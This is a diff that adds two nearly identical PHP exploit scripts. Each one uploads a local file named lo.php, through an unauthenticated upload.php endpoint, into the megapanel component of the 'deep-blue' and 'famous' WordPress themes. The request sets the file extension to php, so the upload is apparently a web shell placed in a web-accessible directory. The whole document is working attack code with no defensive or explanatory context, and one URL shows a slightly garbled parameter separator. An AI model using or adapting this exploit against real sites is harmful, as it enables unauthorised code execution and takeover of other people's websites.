@@ -1,0 +1,27 @@
+<?php
+
+$uploadfile="lo.php";
+ 
+$ch = curl_init("http://www.example.com/wordpress/wp-content/themes/deep-blue/megaframe/megapanel/inc/upload.php?folder=/wordpress/wp-content/themes/deep-blue/megaframe/megapanel/inc/&fileext=php");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+<?php
+
+$uploadfile="lo.php";
+ 
+$ch = curl_init("http://www.example.com/wordpress/wp-content/themes/famous/megaframe/megapanel/inc/upload.php?folder=/wordpress/wp-content/themes/famous/megaframe/megapanel/inc/&;fileext=php");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
